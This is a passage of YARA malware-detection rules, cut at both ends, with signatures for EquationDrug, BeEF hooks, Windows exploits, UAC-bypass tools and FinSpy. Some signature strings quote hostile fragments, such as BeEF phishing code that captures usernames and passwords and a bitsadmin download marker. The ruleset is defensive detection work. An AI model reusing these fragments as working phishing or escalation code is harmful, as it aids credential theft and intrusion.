		hash = "597715224249e9fb77dc733b2e4d507f0cc41af6"
	strings:
		$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s1 = "Parmsndsrv.dbg" fullword ascii
		$s2 = "\\Registry\\User\\CurrentUser\\" fullword wide
		$s3 = "msndsrv.sys" fullword wide
		$s5 = "\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Control\\Windows" fullword wide
		$s6 = "\\Device\\%ws_%ws" fullword wide
		$s7 = "\\DosDevices\\%ws" fullword wide
		$s9 = "\\Device\\%ws" fullword wide
	condition:
		all of them
}

rule EquationDrug_Keylogger {
	meta:
		description = "EquationDrug - Key/clipboard logger driver - msrtvd.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "b93aa17b19575a6e4962d224c5801fb78e9a7bb5"
	strings:
		$s0 = "\\registry\\machine\\software\\Microsoft\\Windows NT\\CurrentVersion" fullword wide
		$s2 = "\\registry\\machine\\SYSTEM\\ControlSet001\\Control\\Session Manager\\En" wide
		$s3 = "\\DosDevices\\Gk" fullword wide
		$s5 = "\\Device\\Gk0" fullword wide
	condition:
		all of them
}

rule EquationDrug_NetworkSniffer4 {
	meta:
		description = "EquationDrug - Network-sniffer/patcher - atmdkdrv.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "cace40965f8600a24a2457f7792efba3bd84d9ba"
	strings:
		$s0 = "Copyright 1999 RAVISENT Technologies Inc." fullword wide
		$s1 = "\\systemroot\\" fullword ascii
		$s2 = "RAVISENT Technologies Inc." fullword wide
		$s3 = "Created by VIONA Development" fullword wide
		$s4 = "\\Registry\\User\\CurrentUser\\" fullword wide
		$s5 = "\\device\\harddiskvolume" fullword wide
		$s7 = "ATMDKDRV.SYS" fullword wide
		$s8 = "\\Device\\%ws_%ws" fullword wide
		$s9 = "\\DosDevices\\%ws" fullword wide
		$s10 = "CineMaster C 1.1 WDM Main Driver" fullword wide
		$s11 = "\\Device\\%ws" fullword wide
		$s13 = "CineMaster C 1.1 WDM" fullword wide
	condition:
		all of them
}

rule EquationDrug_PlatformOrchestrator {
	meta:
		description = "EquationDrug - Platform orchestrator - mscfg32.dll, svchost32.dll"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "febc4f30786db7804008dc9bc1cebdc26993e240"
	strings:
		$s0 = "SERVICES.EXE" fullword wide
		$s1 = "\\command.com" fullword wide
		$s2 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s3 = "LSASS.EXE" fullword wide
		$s4 = "Windows Configuration Services" fullword wide
		$s8 = "unilay.dll" fullword ascii
	condition:
		all of them
}

rule EquationDrug_NetworkSniffer5 {
	meta:
		description = "EquationDrug - Network-sniffer/patcher - atmdkdrv.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "09399b9bd600d4516db37307a457bc55eedcbd17"
	strings:
		$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
		$s2 = "atmdkdrv.sys" fullword wide
		$s4 = "\\Device\\%ws_%ws" fullword wide
		$s5 = "\\DosDevices\\%ws" fullword wide
		$s6 = "\\Device\\%ws" fullword wide
	condition:
		all of them
}

rule EquationDrug_FileSystem_Filter {
	meta:
		description = "EquationDrug - Filesystem filter driver – volrec.sys, scsi2mgr.sys"
		author = "Florian Roth @4nc4p"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		date = "2015/03/11"
		hash = "57fa4a1abbf39f4899ea76543ebd3688dcc11e13"
	strings:
		$s0 = "volrec.sys" fullword wide
		$s1 = "volrec.pdb" fullword ascii
		$s2 = "Volume recognizer driver" fullword wide
	condition:
		all of them
}
rule apt_equation_keyword {
    meta:
        description = "Rule to detect Equation group's keyword in executable file"
        author = "Florian Roth @4nc4p"
        last_modified = "2015-09-26"
        reference = "http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/"
    strings:
         $a1 = "Backsnarf_AB25" wide
         $a2 = "Backsnarf_AB25" ascii
    condition:
         uint16(0) == 0x5a4d and 1 of ($a*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

/*
	This Yara Rule is to be considered as "experimental"
	It reperesents a first attempt to detect BeEF hook function in memory
	It still requires further refinement 

*/

rule BeEF_browser_hooked {
	meta:
		description = "Yara rule related to hook.js, BeEF Browser hooking capability"
		author = "Pasquale Stirparo"
		date = "2015-10-07"
		hash1 = "587e611f49baf63097ad2421ad0299b7b8403169ec22456fb6286abf051228db"
	strings:
		$s0 = "mitb.poisonAnchor" wide ascii
		$s1 = "this.request(this.httpproto" wide ascii
		$s2 = "beef.logger.get_dom_identifier" wide ascii
		$s3 = "return (!!window.opera" wide ascii 
		$s4 = "history.pushState({ Be:\"EF\" }" wide ascii 
		$s5 = "window.navigator.userAgent.match(/Opera\\/9\\.80.*Version\\/10\\./)" wide ascii 
		$s6 = "window.navigator.userAgent.match(/Opera\\/9\\.80.*Version\\/11\\./)" wide ascii 
		$s7 = "window.navigator.userAgent.match(/Avant TriCore/)" wide ascii 
		$s8 = "window.navigator.userAgent.match(/Iceweasel" wide ascii 
		$s9 = "mitb.sniff(" wide ascii 
		$s10 = "Method XMLHttpRequest.open override" wide ascii 
		$s11 = ".browser.hasWebSocket" wide ascii 
		$s12 = ".mitb.poisonForm" wide ascii 
		$s13 = "resolved=require.resolve(file,cwd||" wide ascii 
		$s14 = "if (document.domain == domain.replace(/(\\r\\n|\\n|\\r)/gm" wide ascii 
		$s15 = "beef.net.request" wide ascii 
		$s16 = "uagent.search(engineOpera)" wide ascii 
		$s17 = "mitb.sniff" wide ascii
		$s18 = "beef.logger.start" wide ascii
	condition:
		all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
/*
	Yara Rule Set
	Author: Pasquale Stirparo
	Date: 2015-10-08
	Identifier: src_ptheft
*/

/* Rule Set ----------------------------------------------------------------- */

rule src_ptheft_command {
	meta:
		description = "Auto-generated rule - file command.js"
		author = "Pasquale Stirparo"
		reference = "not set"
		date = "2015-10-08"
		hash = "49c0e5400068924ff87729d9e1fece19acbfbd628d085f8df47b21519051b7f3"
	strings:
		$s0 = "var lilogo = 'http://content.linkedin.com/etc/designs/linkedin/katy/global/clientlibs/img/logo.png';" fullword wide ascii /* score: '38.00' */
		$s1 = "dark=document.getElementById('darkenScreenObject'); " fullword wide ascii /* score: '21.00' */
		$s2 = "beef.execute(function() {" fullword wide ascii /* score: '21.00' */
		$s3 = "var logo  = 'http://www.youtube.com/yt/brand/media/image/yt-brand-standard-logo-630px.png';" fullword wide ascii /* score: '32.42' */
		$s4 = "description.text('Enter your Apple ID e-mail address and password');" fullword wide ascii /* score: '28.00' */
		$s5 = "sneakydiv.innerHTML= '<div id=\"edge\" '+edgeborder+'><div id=\"window_container\" '+windowborder+ '><div id=\"title_bar\" ' +ti" wide ascii /* score: '28.00' */
		$s6 = "var logo  = 'https://www.yammer.com/favicon.ico';" fullword wide ascii /* score: '27.42' */
		$s7 = "beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+answer);" fullword wide ascii /* score: '26.00' */
		$s8 = "var title = 'Session Timed Out <img src=\"' + lilogo + '\" align=right height=20 width=70 alt=\"LinkedIn\">';" fullword wide ascii /* score: '24.00' */
		$s9 = "var title = 'Session Timed Out <img src=\"' + logo + '\" align=right height=20 width=70 alt=\"YouTube\">';" fullword wide ascii /* score: '24.00' */
		$s10 = "var title = 'Session Timed Out <img src=\"' + logo + '\" align=right height=24 width=24 alt=\"Yammer\">';" fullword wide ascii /* score: '24.00' */
		$s11 = "var logobox = 'style=\"border:4px #84ACDD solid;border-radius:7px;height:45px;width:45px;background:#ffffff\"';" fullword wide ascii /* score: '21.00' */
		$s12 = "sneakydiv.innerHTML= '<br><img src=\\''+imgr+'\\' width=\\'80px\\' height\\'80px\\' /><h2>Your session has timed out!</h2><p>For" wide ascii /* score: '23.00' */
		$s13 = "inner.append(title, description, user,password);" fullword wide ascii /* score: '23.00' */
		$s14 = "sneakydiv.innerHTML= '<div id=\"window_container\" '+windowborder+ '><div id=\"windowmain\" ' +windowmain+ '><div id=\"title_bar" wide ascii /* score: '23.00' */
		$s15 = "sneakydiv.innerHTML= '<div id=\"window_container\" '+windowborder+ '><div id=\"windowmain\" ' +windowmain+ '><div id=\"title_bar" wide ascii /* score: '23.00' */
		$s16 = "answer = document.getElementById('uname').value+':'+document.getElementById('pass').value;" fullword wide ascii /* score: '22.00' */
		$s17 = "password.keydown(function(event) {" fullword wide ascii /* score: '21.01' */
	condition:
		13 of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule CVE_2015_1701_Taihou {
	meta:
		description = "CVE-2015-1701 compiled exploit code"
		author = "Florian Roth"
		reference = "http://goo.gl/W4nU0q"
		date = "2015-05-13"
		hash1 = "90d17ebd75ce7ff4f15b2df951572653efe2ea17"
		hash2 = "acf181d6c2c43356e92d4ee7592700fa01e30ffb"
		hash3 = "b8aabe12502f7d55ae332905acee80a10e3bc399"
		hash4 = "d9989a46d590ebc792f14aa6fec30560dfe931b1"
		hash5 = "63d1d33e7418daf200dc4660fc9a59492ddd50d9"
		score = 70
	strings:	
		$s3 = "VirtualProtect" fullword
		$s4 = "RegisterClass"
		$s5 = "LoadIcon"
		$s6 = "PsLookupProcessByProcessId" fullword ascii 
		$s7 = "LoadLibmalware_raryExA" fullword ascii
		$s8 = "gSharedInfo" fullword

		$w1 = "user32.dll" wide
		$w2 = "ntdll" wide	
	condition:
		uint16(0) == 0x5a4d and filesize < 160KB and all of ($s*) and 1 of ($w*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule Exploit_MS15_077_078 {
	meta:
		description = "MS15-078 / MS15-077 exploit - generic signature"
		author = "Florian Roth"
		reference = "https://code.google.com/p/google-security-research/issues/detail?id=473&can=1&start=200"
		date = "2015-07-21"
		hash1 = "18e3e840a5e5b75747d6b961fca66a670e3faef252aaa416a88488967b47ac1c"
		hash2 = "0b5dc030e73074b18b1959d1cf7177ff510dbc2a0ec2b8bb927936f59eb3d14d"
		hash3 = "fc609adef44b5c64de029b2b2cff22a6f36b6bdf9463c1bd320a522ed39de5d9"
		hash4 = "ad6bb982a1ecfe080baf0a2b27950f989c107949b1cf02b6e0907f1a568ece15"
	strings:
		$s1 = "GDI32.DLL" fullword ascii
		$s2 = "atmfd.dll" fullword wide
		$s3 = "AddFontMemResourceEx" fullword ascii
		$s4 = "NamedEscape" fullword ascii
		$s5 = "CreateBitmap" fullword ascii
		$s6 = "DeleteObject" fullword ascii

		$op0 = { 83 45 e8 01 eb 07 c7 45 e8 } /* Opcode */
		$op1 = { 8d 85 24 42 fb ff 89 04 24 e8 80 22 00 00 c7 45 } /* Opcode */
		$op2 = { eb 54 8b 15 6c 00 4c 00 8d 85 24 42 fb ff 89 44 } /* Opcode */
		$op3 = { 64 00 88 ff 84 03 70 03 }
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of ($s*) or all of ($op*)
}

rule Exploit_MS15_077_078_HackingTeam {
	meta:
		description = "MS15-078 / MS15-077 exploit - Hacking Team code"
		author = "Florian Roth"
		date = "2015-07-21"
		super_rule = 1
		hash1 = "ad6bb982a1ecfe080baf0a2b27950f989c107949b1cf02b6e0907f1a568ece15"
		hash2 = "fc609adef44b5c64de029b2b2cff22a6f36b6bdf9463c1bd320a522ed39de5d9"
	strings:
		$s1 = "\\SystemRoot\\system32\\CI.dll" fullword ascii /* PEStudio Blacklist: strings */
		$s2 = "\\sysnative\\CI.dll" fullword ascii /* PEStudio Blacklist: strings */
		$s3 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" fullword ascii /* PEStudio Blacklist: strings */
		$s4 = "CRTDLL.DLL" fullword ascii
		$s5 = "\\sysnative" fullword ascii /* PEStudio Blacklist: strings */
		$s6 = "InternetOpenA coolio, trying open %s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2500KB and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

rule Win7Elevatev2 {
	meta:
		description = "Detects Win7Elevate - Windows UAC bypass utility"
		author = "Florian Roth"
		reference = "http://www.pretentiousname.com/misc/W7E_Source/Win7Elevate_Inject.cpp.html"
		date = "2015-05-14"
		hash1 = "4f53ff6a04e46eda92b403faf42219a545c06c29" /* x64 */
		hash2 = "808d04c187a524db402c5b2be17ce799d2654bd1" /* x86 */
		score = 60
	strings:
		$x1 = "This program attempts to bypass Windows 7's default UAC settings to run " wide
		$x2 = "Win7ElevateV2\\x64\\Release\\" ascii
		$x3 = "Run the command normally (without code injection)" wide	
		$x4 = "Inject file copy && elevate command" fullword wide
		$x5 = "http://www.pretentiousname.com/misc/win7_uac_whitelist2.html" fullword wide
		$x6 = "For injection, pick any unelevated Windows process with ASLR on:" fullword wide
		
		$s1 = "\\cmd.exe" wide
		$s2 = "runas" wide
		$s3 = "explorer.exe" wide
		$s4 = "Couldn't load kernel32.dll" wide
		$s5 = "CRYPTBASE.dll" wide
		$s6 = "shell32.dll" wide
		$s7 = "ShellExecuteEx" ascii
		$s8 = "COMCTL32.dll" ascii 
		$s9 = "ShellExecuteEx" ascii
		$s10 = "HeapAlloc" ascii
	condition:
		uint16(0) == 0x5a4d and ( 1 of ($x*) or all of ($s*) )
}

rule UACME_Akagi {
	meta:
		description = "Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor"
		author = "Florian Roth"
		reference = "https://github.com/hfiref0x/UACME"
		date = "2015-05-14"
		hash1 = "edd2138bbd9e76c343051c6dc898054607f2040a"
		hash2 = "e3a919ccc2e759e618208ededa8a543954d49f8a"
		score = 60
	strings:
		$x1 = "UACMe injected, Fubuki at your service." wide fullword
		$x3 = "%temp%\\Hibiki.dll" fullword wide
		$x4 = "[UCM] Cannot write to the target process memory." fullword wide
		
		$s1 = "%systemroot%\\system32\\cmd.exe" wide
		$s2 = "D:(A;;GA;;;WD)" wide
		$s3 = "%systemroot%\\system32\\sysprep\\sysprep.exe" fullword wide
		$s4 = "/c wusa %ws /extract:%%windir%%\\system32" fullword wide
		$s5 = "Fubuki.dll" ascii fullword
		
		$l1 = "ntdll.dll" ascii
		$l2 = "Cabinet.dll" ascii
		$l3 = "GetProcessHeap" ascii
		$l4 = "WriteProcessMemory" ascii
		$l5 = "ShellExecuteEx" ascii
	condition:
		( 1 of ($x*) ) or ( 3 of ($s*) and all of ($l*) ) 
}

rule UACElevator {
	meta:
		description = "UACElevator bypassing UAC - file UACElevator.exe"
		author = "Florian Roth"
		reference = "https://github.com/MalwareTech/UACElevator"
		date = "2015-05-14"
		hash = "fd29d5a72d7a85b7e9565ed92b4d7a3884defba6"
	strings:
		$x1 = "\\UACElevator.pdb" ascii
		
		$s1 = "%userprofile%\\Downloads\\dwmapi.dll" fullword ascii
		$s2 = "%windir%\\system32\\dwmapi.dll" fullword ascii
		$s3 = "Infection module: %s" fullword ascii
		$s4 = "Could not save module to %s" fullword ascii
		$s5 = "%s%s%p%s%ld%s%d%s" fullword ascii
		$s6 = "Stack area around _alloca memory reserved by this function is corrupted" fullword ascii
		$s7 = "Stack around the variable '" fullword ascii
		$s8 = "MSVCR120D.dll" fullword wide
		$s9 = "Address: 0x" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 172KB and 
			( $x1 or 8 of ($s*) )
}

rule s4u {
	meta:
		description = "Detects s4u executable which allows the creation of a cmd.exe with the context of any user without requiring the password. - file s4u.exe"
		author = "Florian Roth"
		reference = "https://github.com/aurel26/s-4-u-for-windows"
		date = "2015-06-05"
		hash = "cfc18f3d5306df208461459a8e667d89ce44ed77"
		score = 50
	strings:
		// Specific strings (may change)
		$x0 = "s4u.exe Domain\\Username [Extra SID]" fullword ascii 
		$x1 = "\\Release\\s4u.pdb" ascii

		// Less specific strings
		$s0 = "CreateProcessAsUser failed (error %u)." fullword ascii 
		$s1 = "GetTokenInformation failed (error: %u)." fullword ascii 
		$s2 = "LsaLogonUser failed (error 0x%x)." fullword ascii 
		$s3 = "LsaLogonUser: OK, LogonId: 0x%x-0x%x" fullword ascii 
		$s4 = "LookupPrivilegeValue failed (error: %u)." fullword ascii 
		$s5 = "The token does not have the specified privilege (%S)." fullword ascii 
		$s6 = "Unable to parse command line." fullword ascii 
		$s7 = "Unable to find logon SID." fullword ascii 
		$s8 = "AdjustTokenPrivileges failed (error: %u)." fullword ascii
		$s9 = "AdjustTokenPrivileges (%S): OK" fullword ascii 
		
		// Generic
		$g1 = "%systemroot%\\system32\\cmd.exe" wide
		$g2 = "SeTcbPrivilege" wide
		$g3 = "winsta0\\default" wide
		$g4 = ".rsrc"
		$g5 = "HeapAlloc"
		$g6 = "GetCurrentProcess"
		$g7 = "HeapFree"
		$g8 = "GetProcessHeap"
		$g9 = "ExpandEnvironmentStrings"
		$g10 = "ConvertStringSidToSid"
		$g11 = "LookupPrivilegeValue"
		$g12 = "AllocateLocallyUniqueId"
		$g13 = "ADVAPI32.dll"
		$g14 = "LsaLookupAuthenticationPackage"
		$g15 = "Secur32.dll"
		$g16 = "MSVCR120.dll"		

	condition:
		uint16(0) == 0x5a4d and filesize < 60KB and ( 1 of ($x*) or all of ($s*) or all of ($g*) ) 
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule EzcobStrings : Ezcob Family
{
    meta:
        description = "Ezcob Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-23"
        
    strings:
        $ = "\x12F\x12F\x129\x12E\x12A\x12E\x12B\x12A\x12-\x127\x127\x128\x123\x12"
        $ = "\x121\x12D\x128\x123\x12B\x122\x12E\x128\x12-\x12B\x122\x123\x12D\x12"
        $ = "Ezcob" wide ascii
        $ = "l\x12i\x12u\x122\x120\x121\x123\x120\x124\x121\x126"
        $ = "20110113144935"
        
    condition:
       any of them
}

rule Ezcob : Family
{
    meta:
        description = "Ezcob"
        author = "Seth Hardy"
        last_modified = "2014-06-23"
        
    condition:
        EzcobStrings
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule ws_f0xy_downloader {
  meta:
    description = "f0xy malware downloader"
    author = "Nick Griffin (Websense)"

  strings:
    $mz="MZ"
    $string1="bitsadmin /transfer"
    $string2="del rm.bat"
    $string3="av_list="
  
  condition:
    ($mz at 0) and (all of ($string*))
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule HTMLVariant : FakeM Family HTML Variant
{
	meta:
		description = "Identifier for html variant of FAKEM"
		author = "Katie Kleemola"
		last_updated = "2014-05-20"
	
	strings:
		// decryption loop
		$s1 = { 8B 55 08 B9 00 50 00 00 8D 3D ?? ?? ?? 00 8B F7 AD 33 C2 AB 83 E9 04 85 C9 75 F5 }
		//mov byte ptr [ebp - x] y, x: 0x10-0x1 y: 0-9,A-F
		$s2 = { C6 45 F? (3?|4?) }

	condition:
		$s1 and #s2 == 16

}

rule FakeM_Generic {
	meta:
		description = "Detects FakeM malware samples"
		author = "Florian Roth"
		reference = "http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/"
		date = "2016-01-25"
		score = 85
		hash1 = "631fc66e57acd52284aba2608e6f31ba19e2807367e33d8704f572f6af6bd9c3"
		hash2 = "3d9bd26f5bd5401efa17690357f40054a3d7b438ce8c91367dbf469f0d9bd520"
		hash3 = "53af257a42a8f182e97dcbb8d22227c27d654bea756d7f34a80cc7982b70aa60"
		hash4 = "4a4dfffae6fc8be77ac9b2c67da547f0d57ffae59e0687a356f5105fdddc88a3"
		hash5 = "7bfbf49aa71b8235a16792ef721b7e4195df11cb75371f651595b37690d108c8"
		hash6 = "12dedcdda853da9846014186e6b4a5d6a82ba0cf61d7fa4cbe444a010f682b5d"
		hash7 = "9adda3d95535c6cf83a1ba08fe83f718f5c722e06d0caff8eab4a564185971c5"
		hash8 = "3209ab95ca7ee7d8c0140f95bdb61a37d69810a7a23d90d63ecc69cc8c51db90"
		hash9 = "41948c73b776b673f954f497e09cc469d55f27e7b6e19acb41b77f7e64c50a33"
		hash10 = "53cecc0d0f6924eacd23c49d0d95a6381834360fbbe2356778feb8dd396d723e"
		hash11 = "523ad50b498bfb5ab688d9b1958c8058f905b634befc65e96f9f947e40893e5b"
	strings:
		$a1 = "\\system32\\kernel32.dll" fullword ascii
		$a2 = "\\boot.lnk" fullword ascii
		$a3 = "%USERPROFILE%" fullword ascii /* Goodware String - occured 16 times */

		$b1 = "Wizard.EXE" fullword wide
		$b2 = "CommandLineA" fullword ascii

		$c1 = "\\system32\\kernel32.dll" fullword ascii
		$c2 = "\\aapz.tmp" fullword ascii

		$e1 = "C:\\Documents and Settings\\A\\" fullword ascii
		$e2 = "\\svchost.exe" fullword ascii
		$e3 = "\\Perform\\Release\\Perform.pdb" fullword ascii

		$f1 = "Browser.EXE" fullword wide
		$f2 = "\\browser.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and
		( all of ($a*) or all of ($b*) or all of ($c*) or all of ($e*) or 1 of ($f*) )
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule FavoriteCode : Favorite Family 
{
    meta:
        description = "Favorite code features"
        author = "Seth Hardy"
        last_modified = "2014-06-24"
    
    strings:
        // standard string hiding
        $ = { C6 45 ?? 3B C6 45 ?? 27 C6 45 ?? 34 C6 45 ?? 75 C6 45 ?? 6B C6 45 ?? 6C C6 45 ?? 3B C6 45 ?? 2F }
        $ = { C6 45 ?? 6F C6 45 ?? 73 C6 45 ?? 73 C6 45 ?? 76 C6 45 ?? 63 C6 45 ?? 65 C6 45 ?? 78 C6 45 ?? 65 }
    
    condition:
        any of them
}

rule FavoriteStrings : Favorite Family
{
    meta:
        description = "Favorite Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-24"
        
    strings:
        $string1 = "!QAZ4rfv"
        $file1 = "msupdater.exe"
        $file2 = "FAVORITES.DAT"
        
    condition:
       any of ($string*) or all of ($file*)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule FinSpy_2
{
    meta:
        description = "FinFisher FinSpy"
	author = "botherder https://github.com/botherder"

    strings:
        $password1 = /\/scomma kbd101\.sys/ wide ascii
        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii
        $password3 = /\/scomma excel2010\.part/ wide ascii
        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii
        $password5 = /\/stab MSVCR32\.manifest/ wide ascii
        $password6 = /\/scomma MSN2010\.dll/ wide ascii
        $password7 = /\/scomma Firefox\.base/ wide ascii
        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii
        $password9 = /\/scomma IE7setup\.sys/ wide ascii
        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii
        $password11 = /\/scomma office2007\.cab/ wide ascii
        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii
        $password13 = /\/scomma outlook2007\.dll/ wide ascii
        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii

        $screenrec1 = /(s)111o00000000\.dat/ wide ascii
        $screenrec2 = /(t)111o00000000\.dat/ wide ascii
        $screenrec3 = /(f)113o00000000\.dat/ wide ascii
        $screenrec4 = /(w)114o00000000\.dat/ wide ascii
        $screenrec5 = /(u)112Q00000000\.dat/ wide ascii
        $screenrec6 = /(v)112Q00000000\.dat/ wide ascii
        $screenrec7 = /(v)112O00000000\.dat/ wide ascii

        //$keylogger1 = /\<%s UTC %s\|%d\|%s\>/ wide ascii
        //$keylogger2 = /1201[0-9A-F]{8}\.dat/ wide ascii

        $micrec = /2101[0-9A-F]{8}\.dat/ wide ascii

        $skyperec1 = /\[%19s\] %25s\:    %s/ wide ascii
        $skyperec2 = /Global\\\{A48F1A32\-A340\-11D0\-BC6B\-00A0C903%\.04X\}/ wide
        $skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\.dat/ wide ascii

        $mouserec1 = /(m)sc183Q000\.dat/ wide ascii
        $mouserec2 = /2201[0-9A-F]{8}\.dat/ wide ascii

        $driver = /\\\\\\\\\.\\\\driverw/ wide ascii

        $janedow1 = /(J)ane Dow\'s x32 machine/ wide ascii
        $janedow2 = /(J)ane Dow\'s x64 machine/ wide ascii

        $versions1 = /(f)inspyv2/ nocase
        $versions2 = /(f)inspyv4/ nocase

        $bootkit1 = /(b)ootkit_x32driver/
        $bootkit2 = /(b)ootkit_x64driver/

        $typo1 = /(S)creenShort Recording/ wide

        $mssounddx = /(S)ystem\\CurrentControlSet\\Services\\mssounddx/ wide

    condition:
        8 of ($password*) or any of ($screenrec*) or $micrec or any of ($skyperec*) or any of ($mouserec*) or $driver or any of ($janedow*) or any of ($versions*) or any of ($bootkit*) or $typo1 or $mssounddx
}

rule FinSpy
{
    meta:
        description = "FinFisher FinSpy"
        author = "AlienVault Labs"

    strings:
        $filter1 = "$password14"
        $filter2 = "$screenrec7"
        $filter3 = "$micrec"
        $filter4 = "$skyperec3"
        $filter5 = "$mouserec2"
        $filter6 = "$driver"
        $filter7 = "$janedow2"
        $filter8 = "$bootkit2"

        $password1 = /\/scomma kbd101\.sys/ wide ascii
        $password2 = /(N)AME,EMAIL CLIENT,EMAIL ADDRESS,SERVER NAME,SERVER TYPE,USERNAME,PASSWORD,PROFILE/ wide ascii
        $password3 = /\/scomma excel2010\.part/ wide ascii
        $password4 = /(A)PPLICATION,PROTOCOL,USERNAME,PASSWORD/ wide ascii
        $password5 = /\/stab MSVCR32\.manifest/ wide ascii
        $password6 = /\/scomma MSN2010\.dll/ wide ascii
        $password7 = /\/scomma Firefox\.base/ wide ascii
        $password8 = /(I)NDEX,URL,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD,FILE,HTTP/ wide ascii
        $password9 = /\/scomma IE7setup\.sys/ wide ascii
        $password10 = /(O)RIGIN URL,ACTION URL,USERNAME FIELD,PASSWORD FIELD,USERNAME,PASSWORD,TIMESTAMP/ wide ascii
        $password11 = /\/scomma office2007\.cab/ wide ascii
        $password12 = /(U)RL,PASSWORD TYPE,USERNAME,PASSWORD,USERNAME FIELD,PASSWORD FIELD/ wide ascii
        $password13 = /\/scomma outlook2007\.dll/ wide ascii
        $password14 = /(F)ILENAME,ENCRYPTION,VERSION,CRC,PASSWORD 1,PASSWORD 2,PASSWORD 3,PATH,SIZE,LAST MODIFICATION DATE,ERROR/ wide ascii

        $screenrec1 = /(s)111o00000000\.dat/ wide ascii
        $screenrec2 = /(t)111o00000000\.dat/ wide ascii
        $screenrec3 = /(f)113o00000000\.dat/ wide ascii
        $screenrec4 = /(w)114o00000000\.dat/ wide ascii
        $screenrec5 = /(u)112Q00000000\.dat/ wide ascii
        $screenrec6 = /(v)112Q00000000\.dat/ wide ascii
        $screenrec7 = /(v)112O00000000\.dat/ wide ascii

        //$keylogger1 = /\<%s UTC %s\|%d\|%s\>/ wide ascii
        //$keylogger2 = /1201[0-9A-F]{8}\.dat/ wide ascii

        $micrec = /2101[0-9A-F]{8}\.dat/ wide ascii

        $skyperec1 = /\[%19s\] %25s\:    %s/ wide ascii
        $skyperec2 = /Global\\\{A48F1A32\-A340\-11D0\-BC6B\-00A0C903%\.04X\}/ wide
        //$skyperec3 = /(1411|1421|1431|1451)[0-9A-F]{8}\.dat/ wide ascii

        //$mouserec1 = /(m)sc183Q000\.dat/ wide ascii
        //$mouserec2 = /2201[0-9A-F]{8}\.dat/ wide ascii

        $driver = /\\\\\\\\\.\\\\driverw/ wide ascii

        $janedow1 = /(J)ane Dow\'s x32 machine/ wide ascii
        $janedow2 = /(J)ane Dow\'s x64 machine/ wide ascii

        //$versions1 = /(f)inspyv2/ nocase
        //$versions2 = /(f)inspyv4/ nocase

        $bootkit1 = /(b)ootkit_x32driver/
        $bootkit2 = /(b)ootkit_x64driver/

        $typo1 = /(S)creenShort Recording/ wide

        $mssounddx = /(S)ystem\\CurrentControlSet\\Services\\mssounddx/ wide

    condition:
